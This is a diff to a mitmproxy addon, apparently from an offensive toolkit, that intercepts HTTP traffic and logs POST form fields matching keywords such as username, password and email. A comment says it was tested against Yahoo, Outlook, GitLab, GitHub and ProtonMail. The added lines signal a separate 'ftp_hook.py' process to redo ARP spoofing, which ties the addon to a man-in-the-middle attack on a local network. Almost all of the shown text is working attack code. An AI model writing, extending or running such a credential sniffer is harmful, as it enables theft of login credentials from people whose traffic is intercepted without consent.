@@ -1,7 +1,12 @@
 from mitmproxy import ctx, http
+from subprocess import check_output
+from os import system
 
 # tested against yahoo, outlook, gitlab, github, protonmail
 KEYWORDS = ["username", "password", "passwd", "login", "email"]
+
+# has re-arped flag
+arp_flag = False
 
 def filter_fields(fields: dict):
     result = []
@@ -20,6 +25,15 @@ class LogCredentials:
     def request(self, flow: http.HTTPFlow):
         method = flow.request.method
         ctx.log.info(f'Received: {method}')
+        if not arp_flag:
+            # catch for if process does not exist
+            try:
+                pid = check_output(["pgrep", "-f", "ftp_hook.py"]).strip().decode()
+                # ftp_hook to perform re-arp on SIGINT
+                system(f'kill -s INT {pid}') 
+            except:
+                pass
+
         if method == 'POST' and flow.request.urlencoded_form:
             body_data = flow.request.urlencoded_form
             ctx.log.info(f'Logged form: {body_data}')
